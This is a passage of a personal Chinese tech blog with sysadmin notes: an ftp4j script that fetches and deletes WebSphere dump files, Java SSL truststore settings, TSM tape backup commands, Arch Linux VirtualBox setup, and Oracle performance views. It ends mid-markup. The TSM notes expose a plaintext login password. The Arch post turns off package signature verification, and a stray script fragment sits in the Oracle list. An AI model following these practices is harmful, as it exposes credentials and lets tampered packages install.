<h4 id="AIX-Toolbox"><a href="#AIX-Toolbox" class="headerlink" title="AIX Toolbox"></a>AIX Toolbox</h4><p><a target="_blank" rel="noopener" href="http://gnome.bullfreeware.com/aixtoolbox/RPMS/ppc">http://gnome.bullfreeware.com/aixtoolbox/RPMS/ppc</a></p>
<h4 id="Open-Source-Software-Archive-for-AIX"><a href="#Open-Source-Software-Archive-for-AIX" class="headerlink" title="Open Source Software Archive for AIX"></a>Open Source Software Archive for AIX</h4><p><a target="_blank" rel="noopener" href="http://www.bullfreeware.com/">http://www.bullfreeware.com/</a><br><a target="_blank" rel="noopener" href="http://www.aixchina.net/?viewnews-16007.html">http://www.aixchina.net/?viewnews-16007.html</a></p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-利用ftp4j删除WAS上的heapdump和javacore文件" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2012-03-08T03:03:59.000Z"><a href="/2012/03/08/%E5%88%A9%E7%94%A8ftp4j%E5%88%A0%E9%99%A4WAS%E4%B8%8A%E7%9A%84heapdump%E5%92%8Cjavacore%E6%96%87%E4%BB%B6/">2012-03-08</a></time>
      
      
  
    <h1 class="title"><a href="/2012/03/08/%E5%88%A9%E7%94%A8ftp4j%E5%88%A0%E9%99%A4WAS%E4%B8%8A%E7%9A%84heapdump%E5%92%8Cjavacore%E6%96%87%E4%BB%B6/">利用ftp4j删除WAS上的heapdump和javacore文件</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">import it.sauronsoftware.ftp4j.FTPClient;</span><br><span class="line"></span><br><span class="line">import java.io.File;</span><br><span class="line"></span><br><span class="line">void init(String server, String user, String passwd, String path) &#123;</span><br><span class="line">  FTPClient client = new FTPClient();</span><br><span class="line">  try &#123;</span><br><span class="line">    String[] ret = client.connect(server);</span><br><span class="line">    for (String r : ret) &#123;</span><br><span class="line">      System.out.println(&quot;out &quot; + r);</span><br><span class="line">    &#125;</span><br><span class="line">    client.login(user, passwd);</span><br><span class="line"></span><br><span class="line">    client.changeDirectory(path);</span><br><span class="line">    </span><br><span class="line">    if (!new File(server).isDirectory()) &#123;</span><br><span class="line">      System.out.println(&quot;making directory &quot; + server);</span><br><span class="line">      new File(server).mkdir();</span><br><span class="line">    &#125;</span><br><span class="line">    String[] fileNames = client.listNames();</span><br><span class="line">    for (String file : fileNames) &#123;</span><br><span class="line">      if (file.indexOf(&quot;heapdump&quot;) != -1</span><br><span class="line">          || file.indexOf(&quot;javacore&quot;) != -1) &#123;</span><br><span class="line">        System.out.println(&quot;download file &quot; + file);</span><br><span class="line">        client.download(file, new File(server + &quot;/&quot; + file));</span><br><span class="line">        client.deleteFile(file);</span><br><span class="line">        System.out.println(&quot;file &quot; + file + &quot; deleted.&quot;);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    //			client.deleteFile(&quot;test.txt&quot;);</span><br><span class="line">    //</span><br><span class="line">    client.logout();</span><br><span class="line">    client.disconnect(true);</span><br><span class="line">  &#125; catch (Exception e) &#123;</span><br><span class="line">    // TODO Auto-generated catch block</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void main() &#123;</span><br><span class="line">  String server = &quot;server&quot;;</span><br><span class="line">  String user = &quot;root&quot;;</span><br><span class="line">  String passwd = &quot;password&quot;;</span><br><span class="line">  String path = &quot;/usr/WebSphere/AppServer/logs/dhwas1&quot;;</span><br><span class="line">  if (bsh.args.length &gt; 0) &#123;</span><br><span class="line">    server = bsh.args[0];</span><br><span class="line">    user = bsh.args[1];</span><br><span class="line">    passwd = bsh.args[2];</span><br><span class="line">    path = bsh.args[3];</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    System.out</span><br><span class="line">        .println(&quot;usage: java -cp bin;ftp4j-1.7.jar;bsh-2.0b4.jar bsh.Interpreter cleanLog.sh serverName root password /usr/WebSphere/AppServer/logs/dhwas1&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  init(server, user, passwd, path);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">main();</span><br></pre></td></tr></table></figure>
      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-Java-mail-by-SSL" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2012-03-01T08:37:36.000Z"><a href="/2012/03/01/Java-mail-by-SSL/">2012-03-01</a></time>
      
      
  
    <h1 class="title"><a href="/2012/03/01/Java-mail-by-SSL/">Java mail by SSL</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <p>  如果没有设置证书，会出现以下Exception:<br>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Caused by: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target </span><br></pre></td></tr></table></figure></p>
<p>  要解决这个问题，方法有两个： </p>
<ol>
<li>java的启动参数添加 -Djavax.net.ssl.trustStore&#x3D;&#x2F;path&#x2F;to&#x2F;jssecacerts </li>
<li>Add properties in java code<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Properties systemProps = System.getProperties(); </span><br><span class="line">systemProps.put( &quot;javax.net.ssl.trustStore&quot;, &quot;/path/to/jssecerts&quot;); </span><br><span class="line">System.setProperties(systemProps); </span><br></pre></td></tr></table></figure></li>
</ol>
<p>参考：<br><a target="_blank" rel="noopener" href="http://www.rap.ucar.edu/staff/paddy/cacerts/index.html">http://www.rap.ucar.edu/staff/paddy/cacerts/index.html</a><br><a target="_blank" rel="noopener" href="http://code.google.com/p/java-use-examples/source/browse/trunk/src/com/aw/ad/util/InstallCert.java">http://code.google.com/p/java-use-examples/source/browse/trunk/src/com/aw/ad/util/InstallCert.java</a> </p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-TSM的备份命令摘录" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2012-02-21T03:15:26.000Z"><a href="/2012/02/21/TSM%E7%9A%84%E5%A4%87%E4%BB%BD%E5%91%BD%E4%BB%A4%E6%91%98%E5%BD%95/">2012-02-21</a></time>
      
      
  
    <h1 class="title"><a href="/2012/02/21/TSM%E7%9A%84%E5%A4%87%E4%BB%BD%E5%91%BD%E4%BB%A4%E6%91%98%E5%BD%95/">TSM的备份命令摘录</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">   LOCATE TYPE ID:</span><br><span class="line">   tapeutil -f /dev/smc0 inventory | more</span><br><span class="line"></span><br><span class="line">  1. Login to TSM: dsmadmc(user:support, pass:lovedh02)</span><br><span class="line"></span><br><span class="line">  2. TSM commands:</span><br><span class="line">     CHECK OUT LTO TAPE:</span><br><span class="line">          -----------------------------------------------------</span><br><span class="line">          q libv</span><br><span class="line">          checkout libv LTOLIB DH22S0 remove=no checklabel=no (use label of yesterday tape)</span><br><span class="line">          q pro</span><br><span class="line">          update volume DH22S0 access=unavailable</span><br><span class="line">          q vol DH22S0 format=detailed</span><br><span class="line">          ------------------------------------------------------</span><br><span class="line">  3. Exit TSM: quit</span><br><span class="line"></span><br><span class="line">  4. commands:</span><br><span class="line">          tapeutil -f /dev/smc0 inventory | more</span><br><span class="line">          tapeutil -f /dev/smc0 move 4096 16</span><br><span class="line">          tapeutil -f /dev/smc0 inventory | more</span><br><span class="line"></span><br><span class="line">  5. CHANGE TAPE</span><br><span class="line">  exit</span><br><span class="line"></span><br><span class="line">  6. LOG BACK INTO dsmadmc</span><br><span class="line"></span><br><span class="line">  7. CHECK IN LTO TAPE:</span><br><span class="line">          -----------------------------------------------------</span><br><span class="line">          (MAKE SURE THE TAPE NUMBER IS CORRECT, WATCHOUT THE DH31S0 HAS BEEN CHANGED TO DH31S1) (today number)</span><br><span class="line"></span><br><span class="line">          delete v DH21S0 discarddata=yes  [notes : delete TODAY&#x27;s label]</span><br><span class="line"></span><br><span class="line">          (MAKE SURE IT IS DONE BEFORE GO INTO THE NEXT LINE)</span><br><span class="line">          q pro</span><br><span class="line"></span><br><span class="line">          label libv ltolib search=bulk labelsource=barcode checkin=scratch overwrite=yes</span><br><span class="line"></span><br><span class="line">          q req</span><br><span class="line"></span><br><span class="line">          rep ???&lt;output 3 digit from command q req&gt;</span><br><span class="line">      (WAIT FOR 2 MINUTES)</span><br><span class="line">          (MAKE SURE THERE&#x27;S NO ACTIVE PROCESS FOUND)</span><br><span class="line">          q pro</span><br><span class="line"></span><br><span class="line">          q libv</span><br><span class="line"></span><br><span class="line">  *******************************************************</span><br><span class="line">  THE FOLLOWINGS ARE COMMAND OUTPUT:</span><br><span class="line"></span><br><span class="line">  tsm: TSM&gt;q pro</span><br><span class="line"></span><br><span class="line">   Process Process Description  Status</span><br><span class="line">    Number</span><br><span class="line">  -------- -------------------- -------------------------------------------------</span><br><span class="line">        39 LABEL LIBVOLUME      ANR8805I Labelling volumes in library LTOLIB; 0</span><br><span class="line">                                 volumes(s) labelled.\</span><br><span class="line"></span><br><span class="line">  tsm: TSM&gt;q pro</span><br><span class="line">  ANR0944E QUERY PROCESS: No active processes found.</span><br><span class="line">  ANS8001I Return code 11.</span><br><span class="line"></span><br><span class="line">  tsm: TSM&gt;q libv</span><br><span class="line"></span><br><span class="line">  Library Name  Volume Name  Status      Owner       Last Use   Home     Device</span><br><span class="line">                                                                Element  Type</span><br><span class="line">  ------------  -----------  ----------  ----------  ---------  -------  ------</span><br><span class="line">  LTOLIB        DH15S0       Scratch                            4,096    LTO</span><br><span class="line"></span><br><span class="line">  *******************************************************</span><br><span class="line">          -----------------------------</span><br><span class="line">  8. Exit TSM: quit</span><br><span class="line">  exit</span><br><span class="line"></span><br><span class="line">  --------</span><br><span class="line">  define volume LTOSTGPOOL DH24S0</span><br><span class="line">  query actlog begindate=today begintime=00:00:00 endtime=09:30:00</span><br><span class="line">  q drive</span><br><span class="line">  q path</span><br><span class="line">  update path tsm ltodrive01 srctype=server desttype=drive library=ltolib device=/dev/rmt1 online=yes</span><br><span class="line">  update path tsm ltodrive02 srctype=server desttype=drive library=ltolib device=/dev/rmt2 online=yes</span><br><span class="line">  checkin libv LTOLIB DH21S0 status=scratch</span><br><span class="line"></span><br><span class="line">q actlog</span><br><span class="line">help query process</span><br><span class="line">select VOLUME_NAME,ACCESS from volumes where access !=&#x27;READWRITE&#x27;</span><br></pre></td></tr></table></figure>

<p> <a target="_blank" rel="noopener" href="http://publib.boulder.ibm.com/infocenter/tivihelp/v1r1/index.jsp?topic=/com.ibm.itsmhpn.doc/b_adminref_hpux217.htm">http://publib.boulder.ibm.com/infocenter/tivihelp/v1r1/index.jsp?topic=%2Fcom.ibm.itsmhpn.doc%2Fb_adminref_hpux217.htm</a><br> tsm script : <a target="_blank" rel="noopener" href="http://www.4bcad.com/doc/misc/tsm_cmds">http://www.4bcad.com/doc/misc/tsm_cmds</a><br> <a target="_blank" rel="noopener" href="http://adsm.org/forum/showthread.php?21614-LABEL-LIBVOLUME-0-volume(s)-labeled-0-volume(s)-checked-in">http://adsm.org/forum/showthread.php?21614-LABEL-LIBVOLUME-0-volume(s)-labeled-0-volume(s)-checked-in</a></a></p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-Archlinux-in-VirtualBox" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2012-02-17T05:36:43.000Z"><a href="/2012/02/17/Archlinux-in-VirtualBox/">2012-02-17</a></time>
      
      
  
    <h1 class="title"><a href="/2012/02/17/Archlinux-in-VirtualBox/">Archlinux in VirtualBox</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <h1 id="Archlinux安装时候选择"><a href="#Archlinux安装时候选择" class="headerlink" title="Archlinux安装时候选择"></a>Archlinux安装时候选择</h1><pre><code>base-devel
kernel header
</code></pre>
<h1 id="Sharepoint"><a href="#Sharepoint" class="headerlink" title="Sharepoint"></a>Sharepoint</h1><pre><code>mount -t vboxsf sharepoint /mnt/share
download jre1.7u2
</code></pre>
<h1 id="Settings"><a href="#Settings" class="headerlink" title="Settings"></a>Settings</h1><pre><code>download tomcat
set .profile_bash
export JRE_HOME=/home/jre.1.7.0_02
export PATH=$PATH:$JRE_HOME/bin
</code></pre>
<h1 id="网络设置"><a href="#网络设置" class="headerlink" title="网络设置"></a>网络设置</h1><ol>
<li><p>VirtualBox设置为Bridge模式</p>
</li>
<li><p>查看IP<br> ip addr<br> ls &#x2F;sys&#x2F;class&#x2F;net&#x2F;</p>
</li>
<li><p>设置IP和DNS<br> cat rc.conf<br> cat resolv.conf</p>
</li>
<li><p>设置host主机的浏览器访问192.168.56.*的IP不经过proxy</p>
</li>
<li><p>设置<a target="_blank" rel="noopener" href="https://wiki.archlinux.org/index.php/Secure_Shell">ssh</a></p>
</li>
</ol>
<p>设置root的密码：<code>passwd root</code></p>
<p>6.建立pacman的本地仓库<br><a target="_blank" rel="noopener" href="https://wiki.archlinux.org/index.php/Pacman_Tips#Installing_packages_from_a_CD.2FDVD.2FISO">https://wiki.archlinux.org/index.php/Pacman_Tips#Installing_packages_from_a_CD.2FDVD.2FISO</a></p>
<p>由于暂时不能上网，所以在pacman.conf文件里注释掉extra和community部分</p>
<p>简单的测试：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pacman -Syu</span><br><span class="line">pacman -U sqlite3-3.7.7.1-1-i686.pkg.tar.xz</span><br></pre></td></tr></table></figure>

<ol start="7">
<li>使用netty的example下的HexDumpProxy作为代理服务器，<br><code>java -cp netty.jar HexDumpProxy 1099 myproxy 8080 </code></li>
</ol>
<p>设置环境变量 export http_proxy&#x3D;<a target="_blank" rel="noopener" href="http://192.168.56.15:1099/">http://192.168.56.15:1099</a></p>
<p><code>export no_proxy=&quot;localhost,127.0.0.1,192.168.56.15&quot;</code><br>reference:  <a target="_blank" rel="noopener" href="https://wiki.archlinux.org/index.php/Proxy_settings">https://wiki.archlinux.org/index.php/Proxy_settings</a></p>
<ol start="8">
<li><p>使用lynx测试, lynx <a target="_blank" rel="noopener" href="http://www.google.com/">http://www.google.com</a></p>
</li>
<li><p>取消pacman.conf的extra和community的注释（因为之前不能上网），在pacman.d&#x2F;mirrorlist打开任意一个Server<br><code>pacman -Syu</code></p>
</li>
<li><p>下载nginx, pacman -S nginx<br>查看<code>pacman -Qil nginx</code></p>
</li>
<li><p>运行nginx出现找不到libpcre.so.1的error<br>处理</p>
</li>
</ol>
<ul>
<li><code>export LD_LIBRARY_PATH=/usr/lib</code></li>
<li><code>ldconfig</code></li>
<li><code>ln -s /usr/lib/libpcre.so /usr/lib/libpcre.so.1</code></li>
</ul>
<ol start="12">
<li>安装vsftpd，方便可以在windows上使用editplus编辑文件，然后upload到arch。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pacman -S vsftp</span><br><span class="line">/etc/rc.d/vsftpd start</span><br></pre></td></tr></table></figure></li>
</ol>
<p>vsftpd.conf</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">write_enable=YES</span><br><span class="line">local_enable=YES</span><br><span class="line"></span><br><span class="line">注释掉anonymous_enable=YES</span><br><span class="line">由于是standalone模式，所以保持listen=YES</span><br></pre></td></tr></table></figure>

<p>参考<br><a target="_blank" rel="noopener" href="https://wiki.archlinux.org/index.php/Very_Secure_FTP_Daemon">https://wiki.archlinux.org/index.php/Very_Secure_FTP_Daemon</a><br><a target="_blank" rel="noopener" href="http://os.51cto.com/art/201008/222036.htm">http://os.51cto.com/art/201008/222036.htm</a></p>
<p>意外情况，安装vsftpd时候，出现很多package的pgp签名有问题的错误，可以参考Archlinux的wiki上pacman-key的文章，我的解决方法是在&#x2F;etc&#x2F;pacman.conf中设置SigLevel&#x3D;Never，不验证package的签名，然后运行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pacman -Syy</span><br><span class="line">pacman -S pacman</span><br><span class="line">pacman -Syu</span><br></pre></td></tr></table></figure>
      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-vi-命令" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2012-01-12T07:09:03.000Z"><a href="/2012/01/12/vi-%E5%91%BD%E4%BB%A4/">2012-01-12</a></time>
      
      
  
    <h1 class="title"><a href="/2012/01/12/vi-%E5%91%BD%E4%BB%A4/">vi 命令</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <p><a target="_blank" rel="noopener" href="http://www.uic.edu/depts/accc/software/unixgeneral/vi101.html">http://www.uic.edu/depts/accc/software/unixgeneral/vi101.html</a></p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-oracle性能相关" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2012-01-12T06:31:56.000Z"><a href="/2012/01/12/oracle%E6%80%A7%E8%83%BD%E7%9B%B8%E5%85%B3/">2012-01-12</a></time>
      
      
  
    <h1 class="title"><a href="/2012/01/12/oracle%E6%80%A7%E8%83%BD%E7%9B%B8%E5%85%B3/">oracle性能相关</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <h1 id="以下视图对性能调整有影响："><a href="#以下视图对性能调整有影响：" class="headerlink" title="以下视图对性能调整有影响："></a>以下视图对性能调整有影响：</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">v$db_object_cache</span><br><span class="line">v$filestat</span><br><span class="line">v$latch$v$latch_children</span><br><span class="line">v$lock&amp;v$locked_object</span><br><span class="line">v$open_cursor</span><br><span class="line">v$parameter</span><br><span class="line">v$parameter&amp;v$system_parameter</span><br><span class="line">v$process</span><br><span class="line">v$rollstat</span><br><span class="line">v$rowcache</span><br><span class="line">v$segstat&amp;v$segment_statistics</span><br><span class="line">v$session</span><br><span class="line">v$session_longops</span><br><span class="line">v$session_wait &amp; v$session_event</span><br><span class="line">v$sesstat</span><br><span class="line">v$sga</span><br><span class="line">v$sgastat</span><br><span class="line">v$sql &amp; v$sql_plan</span><br><span class="line">v$sqltext &amp; v$sqlarea</span><br><span class="line">v$sysstat</span><br><span class="line">v$system_event</span><br><span class="line">v$undostat</span><br><span class="line">v$waitstat replyreload += &#x27;,&#x27; + 240964;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">v$mystat-------&gt;mystat ----------&gt;my session stat   当前会话统计</span><br><span class="line"></span><br><span class="line">v$sesstat------&gt;sesstat-----------&gt;session stat       按会话进行分组统计</span><br><span class="line"></span><br><span class="line">v$sysstat-------&gt;sysstat-----------&gt;system stat       当系统的整体统计</span><br></pre></td></tr></table></figure>

<p>Reference</p>
<p>Oracle性能调整的十大要点 <a target="_blank" rel="noopener" href="http://www.aixchina.net/home/space.php?uid=44376&amp;do=blog&amp;id=25022">http://www.aixchina.net/home/space.php?uid=44376&amp;do=blog&amp;id=25022</a></p>
<p>Oracle的SQL语句大全（摘）<a target="_blank" rel="noopener" href="http://www.aixchina.net/home/space.php?uid=44376&amp;do=blog&amp;id=25080">http://www.aixchina.net/home/space.php?uid=44376&amp;do=blog&amp;id=25080</a></p>
<p>Oracle内存分配与调整     <a target="_blank" rel="noopener" href="http://www.aixchina.net/home/space.php?uid=44376&amp;do=blog&amp;id=26579">http://www.aixchina.net/home/space.php?uid=44376&amp;do=blog&amp;id=26579</a></p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-HttpClient连接https网站" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2011-12-15T02:00:33.000Z"><a href="/2011/12/15/HttpClient%E8%BF%9E%E6%8E%A5https%E7%BD%91%E7%AB%99/">2011-12-15</a></time>
      
      
  
    <h1 class="title"><a href="/2011/12/15/HttpClient%E8%BF%9E%E6%8E%A5https%E7%BD%91%E7%AB%99/">HttpClient连接https网站</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span 